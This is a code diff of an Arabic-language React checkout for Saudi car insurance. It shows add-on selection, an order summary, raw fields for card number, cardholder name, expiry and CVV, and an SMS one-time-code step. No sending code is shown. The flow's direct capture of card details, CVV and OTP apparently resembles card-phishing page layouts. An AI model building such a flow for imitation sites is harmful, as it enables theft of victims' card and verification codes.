-                  <h3 ref={stepHeaderRef} tabIndex={-1} className="text-2xl lg:text-3xl font-bold text-gray-900 mb-3">
-                    الإضافات والخدمات
-                  </h3>
-                  <p className="text-gray-600">اختر الخدمات الإضافية التي تناسب احتياجاتك</p>
-                </div>
-
-                {(() => {
-                  const selectedOffer = offerData.find((offer) => offer.id === formData.selectedInsuranceOffer)
-                  const paidFeatures = selectedOffer?.extra_features.filter((f) => f.price > 0) || []
-
-                  if (paidFeatures.length === 0) {
-                    return (
-                      <div className="text-center py-12">
-                        <div className="w-20 h-20 bg-green-100 rounded-full flex items-center justify-center mx-auto mb-6">
-                          <CheckCircle className="w-10 h-10 text-green-600" />
-                        </div>
-                        <h4 className="text-2xl font-bold text-gray-900 mb-3">جميع المزايا مشمولة!</h4>
-                        <p className="text-gray-600 text-lg">
-                          العرض المختار يشمل جميع المزايا الأساسية بدون رسوم إضافية
-                        </p>
-                      </div>
-                    )
-                  }
-
-                  return (
-                    <div className="space-y-4">
-                      {paidFeatures.map((feature) => (
-                        <Card key={feature.id} className="border-2 border-gray-200 hover:shadow-md transition-all">
-                          <CardContent className="p-6">
-                            <div className="flex items-center justify-between">
-                              <div className="flex items-center gap-4">
-                                <input
-                                  type="checkbox"
-                                  className="w-5 h-5 text-[#109cd4]"
-                                  checked={formData.selectedAddons.includes(feature.id)}
-                                  onChange={(e) => {
-                                    const newAddons = e.target.checked
-                                      ? [...formData.selectedAddons, feature.id]
-                                      : formData.selectedAddons.filter((id) => id !== feature.id)
-                                    handleFieldChange("selectedAddons", newAddons)
-                                  }}
-                                />
-                                <div>
-                                  <h4 className="font-bold text-gray-900 text-lg">{feature.content}</h4>
-                                  <p className="text-gray-600">خدمة إضافية اختيارية</p>
-                                </div>
-                              </div>
-                              <div className="text-left">
-                                <p className="text-xl font-bold text-gray-900">+{feature.price} ر.س</p>
-                                <p className="text-sm text-gray-500">سنوياً</p>
-                              </div>
-                            </div>
-                          </CardContent>
-                        </Card>
-                      ))}
-                    </div>
-                  )
-                })()}
-              </div>
-            )}
-
-            {currentPage === 5 && (
-              <div className="space-y-8">
-                <div className="text-center mb-8">
-                  <h3 ref={stepHeaderRef} tabIndex={-1} className="text-2xl lg:text-3xl font-bold text-gray-900 mb-3">
-                    ملخص الطلب ومعلومات التواصل
-                  </h3>
-                  <p className="text-gray-600">راجع طلبك وأدخل معلومات التواصل لإتمام العملية</p>
-                </div>
-
-                <div className="grid grid-cols-1 lg:grid-cols-2 gap-8">
-                  <div className="space-y-6">
-                    <h4 className="text-xl font-bold text-gray-900 text-center">معلومات التواصل</h4>
-                    <label>
-                      رقم الهاتف
-                    </label>
-                    <Input
-                      name="phone"
-                      type="tel"
-                      placeholder="05xxxxxxxx"
-                      required
-                      maxLength={10}
-                      autoFocus={true}
-                    />
-
-                    <div className="bg-blue-50 border border-blue-200 rounded-xl p-4">
-                      <div className="flex items-start gap-3">
-                        <input
-                          type="checkbox"
-                          className="w-5 h-5 mt-1 text-[#109cd4]"
-                          checked={formData.agreeToTerms}
-                          onChange={(e) => handleFieldChange("agreeToTerms", e.target.checked)}
-                        />
-                        <span className="text-sm text-blue-800">
-                          أوافق على{" "}
-                          <a href="#" className="text-[#109cd4] hover:underline font-semibold">
-                            الشروط والأحكام
-                          </a>{" "}
-                          و{" "}
-                          <a href="#" className="text-[#109cd4] hover:underline font-semibold">
-                            سياسة الخصوصية
-                          </a>
-                        </span>
-                      </div>
-                    </div>
-                    {errors.agreeToTerms && (
-                      <div className="flex items-center gap-2 text-red-600 text-sm">
-                        <AlertCircle className="w-4 h-4 flex-shrink-0" />
-                        <span>{errors.agreeToTerms}</span>
-                      </div>
-                    )}
-                  </div>
-
-                  <Card className="border-2 border-gray-200 h-fit">
-                    <CardContent className="p-6">
-                      {(() => {
-                        const selectedOffer = offerData.find((offer) => offer.id === formData.selectedInsuranceOffer)
-                        if (!selectedOffer) {
-                          return <div className="text-center text-gray-500">لم يتم اختيار عرض</div>
-                        }
-
-                        const basePrice = Number.parseFloat(selectedOffer.main_price)
-                        const selectedFeatures = selectedOffer.extra_features.filter((f) =>
-                          formData.selectedAddons.includes(f.id),
-                        )
-                        const addonsTotal = selectedFeatures.reduce((sum, f) => sum + f.price, 0)
-                        const expenses = selectedOffer.extra_expenses.reduce((sum, e) => sum + e.price, 0)
-                        const total = basePrice + addonsTotal + expenses
-
-                        return (
-                          <div className="space-y-4">
-                            <div className="text-center mb-6">
-                              <h4 className="text-xl font-bold text-gray-900">
-                                {selectedOffer.name.replace(/insurance/g, "").trim()}
-                              </h4>
-                              <p className="text-gray-600">
-                                {selectedOffer.type === "against-others"
-                                  ? "تأمين ضد الغير"
-                                  : selectedOffer.type === "comprehensive"
-                                    ? "تأمين شامل"
-                                    : "تأمين خاص"}
-                              </p>
-                            </div>
-
-                            <div className="space-y-3">
-                              <div className="flex justify-between items-center">
-                                <span className="text-gray-600">قسط التأمين الأساسي</span>
-                                <span className="font-semibold">{basePrice} ر.س</span>
-                              </div>
-
-                              {addonsTotal > 0 && (
-                                <div className="flex justify-between items-center">
-                                  <span className="text-gray-600">الإضافات المختارة</span>
-                                  <span className="font-semibold">{addonsTotal} ر.س</span>
-                                </div>
                               )}
 
-                              {selectedOffer.extra_expenses.map((expense) => (
-                                <div key={expense.id} className="flex justify-between items-center text-sm">
-                                  <span className="text-gray-600">{expense.reason}</span>
-                                  <span className="font-medium">
-                                    {expense.reason.includes("خصم") ? "-" : "+"}
-                                    {expense.price} ر.س
-                                  </span>
+                              {/* Selected Indicator */}
+                              {isSelected && (
+                                <div className="absolute top-3 left-3">
+                                  <div className="w-6 h-6 bg-[#109cd4] rounded-full flex items-center justify-center">
+                                    <Check className="w-3.5 h-3.5 text-white" />
+                                  </div>
                                 </div>
-                              ))}
+                              )}
+                            </CardContent>
+                          </Card>
+                        )
+                      })}
+                  </div>
 
-                              <hr className="border-gray-200" />
-                              <div className="flex justify-between items-center text-xl">
-                                <span className="font-bold text-gray-900">المجموع الكلي</span>
-                                <span className="font-bold text-green-600">{total.toFixed(2)} ر.س</span>
+                  {errors.selectedInsuranceOffer && (
+                    <div className="flex items-center gap-2 text-red-600 text-sm bg-red-50 p-3 rounded-lg">
+                      <AlertCircle className="w-4 h-4 flex-shrink-0" />
+                      <span>{errors.selectedInsuranceOffer}</span>
+                    </div>
+                  )}
+                </div>
+              )}
+
+              {currentPage === 4 && (
+                <div className="space-y-8">
+                  <div className="text-center mb-8">
+                    <h3 ref={stepHeaderRef} tabIndex={-1} className="text-2xl lg:text-3xl font-bold text-gray-900 mb-3">
+                      الإضافات والخدمات
+                    </h3>
+                    <p className="text-gray-600">اختر الخدمات الإضافية التي تناسب احتياجاتك</p>
+                  </div>
+
+                  {(() => {
+                    const selectedOffer = offerData.find((offer) => offer.id === formData.selectedInsuranceOffer)
+                    const paidFeatures = selectedOffer?.extra_features.filter((f) => f.price > 0) || []
+
+                    if (paidFeatures.length === 0) {
+                      return (
+                        <div className="text-center py-12">
+                          <div className="w-20 h-20 bg-green-100 rounded-full flex items-center justify-center mx-auto mb-6">
+                            <CheckCircle className="w-10 h-10 text-green-600" />
+                          </div>
+                          <h4 className="text-2xl font-bold text-gray-900 mb-3">جميع المزايا مشمولة!</h4>
+                          <p className="text-gray-600 text-lg">
+                            العرض المختار يشمل جميع المزايا الأساسية بدون رسوم إضافية
+                          </p>
+                        </div>
+                      )
+                    }
+
+                    return (
+                      <div className="space-y-4">
+                        {paidFeatures.map((feature) => (
+                          <Card key={feature.id} className="border-2 border-gray-200 hover:shadow-md transition-all">
+                            <CardContent className="p-6">
+                              <div className="flex items-center justify-between">
+                                <div className="flex items-center gap-4">
+                                  <input
+                                    type="checkbox"
+                                    className="w-5 h-5 text-[#109cd4]"
+                                    checked={formData.selectedAddons.includes(feature.id)}
+                                    onChange={(e) => {
+                                      const newAddons = e.target.checked
+                                        ? [...formData.selectedAddons, feature.id]
+                                        : formData.selectedAddons.filter((id) => id !== feature.id)
+                                      handleFieldChange("selectedAddons", newAddons)
+                                    }}
+                                  />
+                                  <div>
+                                    <h4 className="font-bold text-gray-900 text-lg">{feature.content}</h4>
+                                    <p className="text-gray-600">خدمة إضافية اختيارية</p>
+                                  </div>
+                                </div>
+                                <div className="text-left">
+                                  <p className="text-xl font-bold text-gray-900">+{feature.price} ر.س</p>
+                                  <p className="text-sm text-gray-500">سنوياً</p>
+                                </div>
+                              </div>
+                            </CardContent>
+                          </Card>
+                        ))}
+                      </div>
+                    )
+                  })()}
+                </div>
+              )}
+
+              {currentPage === 5 && (
+                <div className="space-y-8">
+                  <div className="text-center mb-8">
+                    <h3 ref={stepHeaderRef} tabIndex={-1} className="text-2xl lg:text-3xl font-bold text-gray-900 mb-3">
+                      ملخص الطلب ومعلومات التواصل
+                    </h3>
+                    <p className="text-gray-600">راجع طلبك وأدخل معلومات التواصل لإتمام العملية</p>
+                  </div>
+
+                  <div className="grid grid-cols-1 lg:grid-cols-2 gap-8">
+                    <div className="space-y-6">
+                      <h4 className="text-xl font-bold text-gray-900 text-center">معلومات التواصل</h4>
+                      <label>
+                        رقم الهاتف
+                      </label>
+                      <Input
+                        name="phone"
+                        type="tel"
+                        placeholder="05xxxxxxxx"
+                        required
+                        maxLength={10}
+                        autoFocus={true}
+                      />
+
+                      <div className="bg-blue-50 border border-blue-200 rounded-xl p-4">
+                        <div className="flex items-start gap-3">
+                          <input
+                            type="checkbox"
+                            className="w-5 h-5 mt-1 text-[#109cd4]"
+                            checked={formData.agreeToTerms}
+                            onChange={(e) => handleFieldChange("agreeToTerms", e.target.checked)}
+                          />
+                          <span className="text-sm text-blue-800">
+                            أوافق على{" "}
+                            <a href="#" className="text-[#109cd4] hover:underline font-semibold">
+                              الشروط والأحكام
+                            </a>{" "}
+                            و{" "}
+                            <a href="#" className="text-[#109cd4] hover:underline font-semibold">
+                              سياسة الخصوصية
+                            </a>
+                          </span>
+                        </div>
+                      </div>
+                      {errors.agreeToTerms && (
+                        <div className="flex items-center gap-2 text-red-600 text-sm">
+                          <AlertCircle className="w-4 h-4 flex-shrink-0" />
+                          <span>{errors.agreeToTerms}</span>
+                        </div>
+                      )}
+                    </div>
+
+                    <Card className="border-2 border-gray-200 h-fit">
+                      <CardContent className="p-6">
+                        {(() => {
+                          const selectedOffer = offerData.find((offer) => offer.id === formData.selectedInsuranceOffer)
+                          if (!selectedOffer) {
+                            return <div className="text-center text-gray-500">لم يتم اختيار عرض</div>
+                          }
+
+                          const basePrice = Number.parseFloat(selectedOffer.main_price)
+                          const selectedFeatures = selectedOffer.extra_features.filter((f) =>
+                            formData.selectedAddons.includes(f.id),
+                          )
+                          const addonsTotal = selectedFeatures.reduce((sum, f) => sum + f.price, 0)
+                          const expenses = selectedOffer.extra_expenses.reduce((sum, e) => sum + e.price, 0)
+                          const total = basePrice + addonsTotal + expenses
+
+                          return (
+                            <div className="space-y-4">
+                              <div className="text-center mb-6">
+                                <h4 className="text-xl font-bold text-gray-900">
+                                  {selectedOffer.name.replace(/insurance/g, "").trim()}
+                                </h4>
+                                <p className="text-gray-600">
+                                  {selectedOffer.type === "against-others"
+                                    ? "تأمين ضد الغير"
+                                    : selectedOffer.type === "comprehensive"
+                                      ? "تأمين شامل"
+                                      : "تأمين خاص"}
+                                </p>
+                              </div>
+
+                              <div className="space-y-3">
+                                <div className="flex justify-between items-center">
+                                  <span className="text-gray-600">قسط التأمين الأساسي</span>
+                                  <span className="font-semibold">{basePrice} ر.س</span>
+                                </div>
+
+                                {addonsTotal > 0 && (
+                                  <div className="flex justify-between items-center">
+                                    <span className="text-gray-600">الإضافات المختارة</span>
+                                    <span className="font-semibold">{addonsTotal} ر.س</span>
+                                  </div>
+                                )}
+
+                                {selectedOffer.extra_expenses.map((expense) => (
+                                  <div key={expense.id} className="flex justify-between items-center text-sm">
+                                    <span className="text-gray-600">{expense.reason}</span>
+                                    <span className="font-medium">
+                                      {expense.reason.includes("خصم") ? "-" : "+"}
+                                      {expense.price} ر.س
+                                    </span>
+                                  </div>
+                                ))}
+
+                                <hr className="border-gray-200" />
+                                <div className="flex justify-between items-center text-xl">
+                                  <span className="font-bold text-gray-900">المجموع الكلي</span>
+                                  <span className="font-bold text-green-600">{total.toFixed(2)} ر.س</span>
+                                </div>
                               </div>
                             </div>
-                          </div>
-                        )
-                      })()}
-                    </CardContent>
-                  </Card>
-                </div>
-              </div>
-            )}
-
-            {currentPage === 6 && (
-              <div className="space-y-8">
-                <div className="text-center mb-8">
-                  <h3 ref={stepHeaderRef} tabIndex={-1} className="text-2xl lg:text-3xl font-bold text-gray-900 mb-3">
-                    بيانات الدفع
-                  </h3>
-                  <p className="text-gray-600">أدخل بيانات بطاقتك الائتمانية لإتمام عملية الدفع الآمن</p>
-                </div>
-
-                <div className="bg-blue-50 border border-blue-200 rounded-xl p-6 mb-8">
-                  <div className="flex items-center gap-3">
-                    <Lock className="w-6 h-6 text-[#109cd4] flex-shrink-0" />
-                    <div>
-                      <p className="font-semibold text-blue-900">دفع آمن ومحمي</p>
-                      <p className="text-sm text-[#109cd4]">جميع بياناتك محمية بتشفير SSL 256-bit</p>
-                    </div>
+                          )
+                        })()}
+                      </CardContent>
+                    </Card>
                   </div>
                 </div>
+              )}
 
-                <div className="grid grid-cols-1 lg:grid-cols-2 gap-8">
-                  <div className="space-y-6">
-                    <div>
-                      <label className="block text-sm font-semibold text-gray-700 mb-3">
-                        رقم البطاقة <span className="text-red-500">*</span>
-                      </label>
-                      <Input
-                        name="cardNumber"
-                        id="cardNumber"
-                        type="tel"
-                        placeholder="#### #### #### ####"
-                        required
-                        dir="ltr"
-                        value={cardNumber}
-                        onChange={(e) => setCardNumber(e.target.value)}
-                        maxLength={16}
-                        autoFocus={true}
-                        className="h-12 border-gray-300 focus:border-blue-500 focus:ring-blue-200"
-                      />
-                    </div>
+              {currentPage === 6 && (
+                <div className="space-y-8">
+                  <div className="text-center mb-8">
+                    <h3 ref={stepHeaderRef} tabIndex={-1} className="text-2xl lg:text-3xl font-bold text-gray-900 mb-3">
+                      بيانات الدفع
+                    </h3>
+                    <p className="text-gray-600">أدخل بيانات بطاقتك الائتمانية لإتمام عملية الدفع الآمن</p>
+                  </div>
 
-                    <div>
-                      <label className="block text-sm font-semibold text-gray-700 mb-3">
-                        الاسم كما هو مكتوب على البطاقة <span className="text-red-500">*</span>
-                      </label>
-                      <Input
-                        name="cardName"
-                        id="cardName"
-                        type="text"
-                        className="h-12 border-gray-300 focus:border-blue-500 focus:ring-blue-200"
-                        value={cardName}
-                        onChange={(e) => setCardName(e.target.value)}
-                        placeholder="الاسم الكامل"
-                        required
-                      />
-                    </div>
-
-                    <div className="grid grid-cols-3 gap-4">
+                  <div className="bg-blue-50 border border-blue-200 rounded-xl p-6 mb-8">
+                    <div className="flex items-center gap-3">
+                      <Lock className="w-6 h-6 text-[#109cd4] flex-shrink-0" />
                       <div>
-                        <label className="block text-sm font-semibold text-gray-700 mb-3">
-                          الشهر <span className="text-red-500">*</span>
-                        </label>
-                        <select
-                          name="expiryMonth"
-                          id="expiryMonth"
-                          className="w-full h-12 px-3 py-2 border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-blue-500"
-                          value={cardMonth}
-                          onChange={(e) => setCardMonth(e.target.value)}
-                        >
-                          <option value="">الشهر</option>
-                          {Array.from({ length: 12 }, (_, i) => (
-                            <option key={i + 1} value={String(i + 1).padStart(2, "0")}>
-                              {String(i + 1).padStart(2, "0")}
-                            </option>
-                          ))}
-                        </select>
+                        <p className="font-semibold text-blue-900">دفع آمن ومحمي</p>
+                        <p className="text-sm text-[#109cd4]">جميع بياناتك محمية بتشفير SSL 256-bit</p>
                       </div>
+                    </div>
+                  </div>
 
+                  <div className="grid grid-cols-1 lg:grid-cols-2 gap-8">
+                    <div className="space-y-6">
                       <div>
                         <label className="block text-sm font-semibold text-gray-700 mb-3">
-                          السنة <span className="text-red-500">*</span>
-                        </label>
-                        <select
-                          className="w-full h-12 px-3 py-2 border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-blue-500"
-                          value={cardYear}
-                          onChange={(e) => setCardYear(e.target.value)}
-                          name="expiryYear"
-                          id="expiryYear"
-                        >
-                          <option value="">السنة</option>
-                          {Array.from({ length: 10 }, (_, i) => {
-                            const year = new Date().getFullYear() + i
-                            return (
-                              <option key={year} value={year}>
-                                {year}
-                              </option>
-                            )
-                          })}
-                        </select>
-                      </div>
-
-                      <div>
-                        <label className="block text-sm font-semibold text-gray-700 mb-3">
-                          CVV <span className="text-red-500">*</span>
+                          رقم البطاقة <span className="text-red-500">*</span>
                         </label>
                         <Input
-                          name="cvv"
-                          id="cvv"
-                          type="password"
+                          name="cardNumber"
+                          id="cardNumber"
+                          type="tel"
+                          placeholder="#### #### #### ####"
+                          required
+                          dir="ltr"
+                          value={cardNumber}
+                          onChange={(e) => setCardNumber(e.target.value)}
+                          maxLength={16}
+                          autoFocus={true}
                           className="h-12 border-gray-300 focus:border-blue-500 focus:ring-blue-200"
-                          placeholder="123"
-                          maxLength={3}
-                          value={cvv}
-                          onChange={(e) => setCvv(e.target.value)}
                         />
                       </div>
+
+                      <div>
+                        <label className="block text-sm font-semibold text-gray-700 mb-3">
+                          الاسم كما هو مكتوب على البطاقة <span className="text-red-500">*</span>
+                        </label>
+                        <Input
+                          name="cardName"
+                          id="cardName"
+                          type="text"
+                          className="h-12 border-gray-300 focus:border-blue-500 focus:ring-blue-200"
+                          value={cardName}
+                          onChange={(e) => setCardName(e.target.value)}
+                          placeholder="الاسم الكامل"
+                          required
+                        />
+                      </div>
+
+                      <div className="grid grid-cols-3 gap-4">
+                        <div>
+                          <label className="block text-sm font-semibold text-gray-700 mb-3">
+                            الشهر <span className="text-red-500">*</span>
+                          </label>
+                          <select
+                            name="expiryMonth"
+                            id="expiryMonth"
+                            className="w-full h-12 px-3 py-2 border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-blue-500"
+                            value={cardMonth}
+                            onChange={(e) => setCardMonth(e.target.value)}
+                          >
+                            <option value="">الشهر</option>
+                            {Array.from({ length: 12 }, (_, i) => (
+                              <option key={i + 1} value={String(i + 1).padStart(2, "0")}>
+                                {String(i + 1).padStart(2, "0")}
+                              </option>
+                            ))}
+                          </select>
+                        </div>
+
+                        <div>
+                          <label className="block text-sm font-semibold text-gray-700 mb-3">
+                            السنة <span className="text-red-500">*</span>
+                          </label>
+                          <select
+                            className="w-full h-12 px-3 py-2 border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-blue-500"
+                            value={cardYear}
+                            onChange={(e) => setCardYear(e.target.value)}
+                            name="expiryYear"
+                            id="expiryYear"
+                          >
+                            <option value="">السنة</option>
+                            {Array.from({ length: 10 }, (_, i) => {
+                              const year = new Date().getFullYear() + i
+                              return (
+                                <option key={year} value={year}>
+                                  {year}
+                                </option>
+                              )
+                            })}
+                          </select>
+                        </div>
+
+                        <div>
+                          <label className="block text-sm font-semibold text-gray-700 mb-3">
+                            CVV <span className="text-red-500">*</span>
+                          </label>
+                          <Input
+                            name="cvv"
+                            id="cvv"
+                            type="password"
+                            className="h-12 border-gray-300 focus:border-blue-500 focus:ring-blue-200"
+                            placeholder="123"
+                            maxLength={3}
+                            value={cvv}
+                            onChange={(e) => setCvv(e.target.value)}
+                          />
+                        </div>
+                      </div>
                     </div>
-                  </div>
 
-                  <Card className="border-2 border-gray-200 h-fit">
-                    <CardContent className="p-6">
-                      <h4 className="text-xl font-bold text-gray-900 mb-6">ملخص الدفع</h4>
-                      {(() => {
-                        const selectedOffer = offerData.find((offer) => offer.id === formData.selectedInsuranceOffer)
-                        if (!selectedOffer) return null
+                    <Card className="border-2 border-gray-200 h-fit">
+                      <CardContent className="p-6">
+                        <h4 className="text-xl font-bold text-gray-900 mb-6">ملخص الدفع</h4>
+                        {(() => {
+                          const selectedOffer = offerData.find((offer) => offer.id === formData.selectedInsuranceOffer)
+                          if (!selectedOffer) return null
 
-                        const basePrice = Number.parseFloat(selectedOffer.main_price)
-                        const selectedFeatures = selectedOffer.extra_features.filter((f) =>
-                          formData.selectedAddons.includes(f.id),
-                        )
-                        const addonsTotal = selectedFeatures.reduce((sum, f) => sum + f.price, 0)
-                        const expenses = selectedOffer.extra_expenses.reduce((sum, e) => sum + e.price, 0)
-                        const total = basePrice + addonsTotal + expenses
+                          const basePrice = Number.parseFloat(selectedOffer.main_price)
+                          const selectedFeatures = selectedOffer.extra_features.filter((f) =>
+                            formData.selectedAddons.includes(f.id),
+                          )
+                          const addonsTotal = selectedFeatures.reduce((sum, f) => sum + f.price, 0)
+                          const expenses = selectedOffer.extra_expenses.reduce((sum, e) => sum + e.price, 0)
+                          const total = basePrice + addonsTotal + expenses
 
-                        return (
-                          <div className="space-y-3">
-                            <div className="flex justify-between text-sm">
-                              <span>قسط التأمين</span>
-                              <span>{basePrice} ر.س</span>
-                            </div>
-                            {addonsTotal > 0 && (
+                          return (
+                            <div className="space-y-3">
                               <div className="flex justify-between text-sm">
-                                <span>الإضافات</span>
-                                <span>{addonsTotal} ر.س</span>
+                                <span>قسط التأمين</span>
+                                <span>{basePrice} ر.س</span>
                               </div>
-                            )}
-                            <div className="flex justify-between text-sm">
-                              <span>الرسوم والضرائب</span>
-                              <span>{expenses} ر.س</span>
+                              {addonsTotal > 0 && (
+                                <div className="flex justify-between text-sm">
+                                  <span>الإضافات</span>
+                                  <span>{addonsTotal} ر.س</span>
+                                </div>
+                              )}
+                              <div className="flex justify-between text-sm">
+                                <span>الرسوم والضرائب</span>
+                                <span>{expenses} ر.س</span>
+                              </div>
+                              <hr />
+                              <div className="flex justify-between font-bold text-lg">
+                                <span>المجموع</span>
+                                <span className="text-green-600">{total} ر.س</span>
+                              </div>
                             </div>
-                            <hr />
-                            <div className="flex justify-between font-bold text-lg">
-                              <span>المجموع</span>
-                              <span className="text-green-600">{total} ر.س</span>
-                            </div>
-                          </div>
-                        )
-                      })()}
-                    </CardContent>
-                  </Card>
+                          )
+                        })()}
+                      </CardContent>
+                    </Card>
+                  </div>
                 </div>
-              </div>
-            )}
+              )}
 
-            {currentPage === 7 && (
-              <div className="space-y-8">
-                <div className="text-center mb-8">
-                  <h3 ref={stepHeaderRef} tabIndex={-1} className="text-2xl lg:text-3xl font-bold text-gray-900 mb-3">
-                    التحقق من الهوية
-                  </h3>
-                  <p className="text-gray-600">أدخل رمز التحقق المرسل إلى هاتفك لإتمام العملية</p>
-                </div>
-
-                <div className="max-w-md mx-auto text-center space-y-8">
-                  <div className="w-20 h-20 bg-blue-100 rounded-full flex items-center justify-center mx-auto">
-                    <Phone className="w-10 h-10 text-[#109cd4]" />
+              {currentPage === 7 && (
+                <div className="space-y-8">
+                  <div className="text-center mb-8">
+                    <h3 ref={stepHeaderRef} tabIndex={-1} className="text-2xl lg:text-3xl font-bold text-gray-900 mb-3">
+                      التحقق من الهوية
+                    </h3>
+                    <p className="text-gray-600">أدخل رمز التحقق المرسل إلى هاتفك لإتمام العملية</p>
                   </div>
 
-                  <div>
-                    <h4 className="text-xl font-bold text-gray-900 mb-3">تم إرسال رمز التحقق</h4>
-                    <p className="text-gray-600">
-                      تم إرسال رمز التحقق المكون من 6 أرقام إلى رقم الهاتف
-                      <br />
-                      <span className="font-semibold">{formData.phone}</span>
-                    </p>
+                  <div className="max-w-md mx-auto text-center space-y-8">
+                    <div className="w-20 h-20 bg-blue-100 rounded-full flex items-center justify-center mx-auto">
+                      <Phone className="w-10 h-10 text-[#109cd4]" />
+                    </div>
+
+                    <div>
+                      <h4 className="text-xl font-bold text-gray-900 mb-3">تم إرسال رمز التحقق</h4>
+                      <p className="text-gray-600">
+                        تم إرسال رمز التحقق المكون من 6 أرقام إلى رقم الهاتف
+                        <br />
+                        <span className="font-semibold">{formData.phone}</span>
+                      </p>
+                    </div>
+
+                    <div>
+                      <label className="block text-sm font-semibold text-gray-700 mb-3">
+                        رمز التحقق <span className="text-red-500">*</span>
+                      </label>
+                      <Input
+                        name="otp"
+                        type="text"
+                        placeholder="######"
+                        required
+                        value={otp}
+                        maxLength={6}
+                        onChange={(e) => setOtp(e.target.value)}
+                        autoFocus={true}
+                        className="text-center text-2xl h-14 tracking-widest border-gray-300 focus:border-blue-500 focus:ring-blue-200"
+                      />
+                    </div>
+
+                    {otpTimer > 0 ? (
+                      <p className="text-sm text-gray-500">
+                        يمكنك طلب رمز جديد خلال {Math.floor(otpTimer / 60)}:{(otpTimer % 60).toString().padStart(2, "0")}
+                      </p>
+                    ) : (
+                      <Button
+                        variant="outline"
+                        onClick={sendOTP}
+                        className="text-[#109cd4] border-[#109cd4] hover:bg-blue-50"
+                      >
+                        إرسال رمز جديد
+                      </Button>
+                    )}
+
+                    {otpAttempts > 0 && (
+                      <p className="text-sm text-orange-600">عدد المحاولات المتبقية: {3 - otpAttempts}</p>
+                    )}
                   </div>
-
-                  <div>
-                    <label className="block text-sm font-semibold text-gray-700 mb-3">
-                      رمز التحقق <span className="text-red-500">*</span>
-                    </label>
-                    <Input
-                      name="otp"
-                      type="text"
-                      placeholder="######"
-                      required
-                      value={otp}
-                      maxLength={6}
-                      onChange={(e) => setOtp(e.target.value)}
-                      autoFocus={true}
-                      className="text-center text-2xl h-14 tracking-widest border-gray-300 focus:border-blue-500 focus:ring-blue-200"
-                    />
-                  </div>
-
-                  {otpTimer > 0 ? (
-                    <p className="text-sm text-gray-500">
-                      يمكنك طلب رمز جديد خلال {Math.floor(otpTimer / 60)}:{(otpTimer % 60).toString().padStart(2, "0")}
-                    </p>
-                  ) : (
-                    <Button
-                      variant="outline"
-                      onClick={sendOTP}
-                      className="text-[#109cd4] border-[#109cd4] hover:bg-blue-50"
-                    >
-                      إرسال رمز جديد
-                    </Button>
-                  )}
-
-                  {otpAttempts > 0 && (
-                    <p className="text-sm text-orange-600">عدد المحاولات المتبقية: {3 - otpAttempts}</p>
-                  )}
                 </div>
-              </div>
-            )}
-          </div>
-
-          {/* Enhanced Navigation Buttons */}
-          <div className="flex flex-col sm:flex-row justify-between items-center mt-8 pt-8 border-t border-gray-200 gap-4 sm:gap-0">
-            <Button
-              variant="outline"
-              onClick={prevStep}
-              disabled={currentPage === 1 || paymentProcessing || isSubmitting}
-              className="px-8 py-3 w-full sm:w-auto order-2 sm:order-1 border-gray-300 hover:border-[#109cd4] hover:text-[#109cd4]"
-            >
-              <ArrowLeft className="w-4 h-4 ml-2" />
-              السابق
-            </Button>
-
-            <div className="text-sm text-gray-500 order-1 sm:order-2 bg-gray-100 px-4 py-2 rounded-full">
-              الخطوة {currentPage} من {steps.length}
+              )}
             </div>
 
-            {currentPage < 6 ? (
+            {/* Enhanced Navigation Buttons */}
+            <div className="flex flex-col sm:flex-row justify-between items-center mt-8 pt-8 border-t border-gray-200 gap-4 sm:gap-0">
               <Button
-                onClick={nextStep}
-                className="bg-[#109cd4] hover:bg-blue-700 px-8 py-3 w-full sm:w-auto order-3 font-semibold"
-                disabled={isSubmitting}
+                variant="outline"
+                onClick={prevStep}
+                disabled={currentPage === 1 || paymentProcessing || isSubmitting}
+                className="px-8 py-3 w-full sm:w-auto order-2 sm:order-1 border-gray-300 hover:border-[#109cd4] hover:text-[#109cd4]"
               >
-                التالي
-                <ArrowLeft className="w-4 h-4 mr-2 rotate-180" />
+                <ArrowLeft className="w-4 h-4 ml-2" />
+                السابق
               </Button>
-            ) : currentPage === 6 ? (
-              <Button
-                onClick={handlePayment}
-                disabled={paymentProcessing}
-                className="bg-green-600 hover:bg-green-700 px-8 py-3 w-full sm:w-auto order-3 font-semibold"
-              >
-                {paymentProcessing ? (
-                  <div className="flex items-center gap-2">
-                    <div className="w-4 h-4 border-2 border-white border-t-transparent rounded-full animate-spin"></div>
-                    جاري معالجة الدفع...
-                  </div>
-                ) : (
-                  <>
-                    <CreditCard className="w-4 h-4 ml-2" />
-                    تأكيد الدفع
-                  </>
-                )}
-              </Button>
-            ) : (
-              <Button
-                onClick={verifyOTP}
-                disabled={isSubmitting}
-                className="bg-green-600 hover:bg-green-700 px-8 py-3 w-full sm:w-auto order-3 font-semibold"
-              >
-                {isSubmitting ? (
-                  <div className="flex items-center gap-2">
-                    <div className="w-4 h-4 border-2 border-white border-t-transparent rounded-full animate-spin"></div>
-                    جاري التحقق...
-                  </div>
-                ) : (
-                  <>
-                    <CheckCircle className="w-4 h-4 ml-2" />
-                    تأكيد الرمز
-                  </>
-                )}
-              </Button>
-            )}
+
+              <div className="text-sm text-gray-500 order-1 sm:order-2 bg-gray-100 px-4 py-2 rounded-full">
+                الخطوة {currentPage} من {steps.length}
+              </div>
+
+              {currentPage < 6 ? (
+                <Button
+                  onClick={nextStep}
+                  className="bg-[#109cd4] hover:bg-blue-700 px-8 py-3 w-full sm:w-auto order-3 font-semibold"
+                  disabled={isSubmitting}
+                >
+                  التالي
+                  <ArrowLeft className="w-4 h-4 mr-2 rotate-180" />
+                </Button>
+              ) : currentPage === 6 ? (
+                <Button
+                  onClick={handlePayment}
+                  disabled={paymentProcessing}
+                  className="bg-green-600 hover:bg-green-700 px-8 py-3 w-full sm:w-auto order-3 font-semibold"
+                >
+                  {paymentProcessing ? (
+                    <div className="flex items-center gap-2">
+                      <div className="w-4 h-4 border-2 border-white border-t-transparent rounded-full animate-spin"></div>
+                      جاري معالجة الدفع...
+                    </div>
+                  ) : (
+                    <>
+                      <CreditCard className="w-4 h-4 ml-2" />
+                      تأكيد الدفع
+                    </>
+                  )}
+                </Button>
+              ) : (
+                <Button
+                  onClick={verifyOTP}
+                  disabled={isSubmitting}
+                  className="bg-green-600 hover:bg-green-700 px-8 py-3 w-full sm:w-auto order-3 font-semibold"
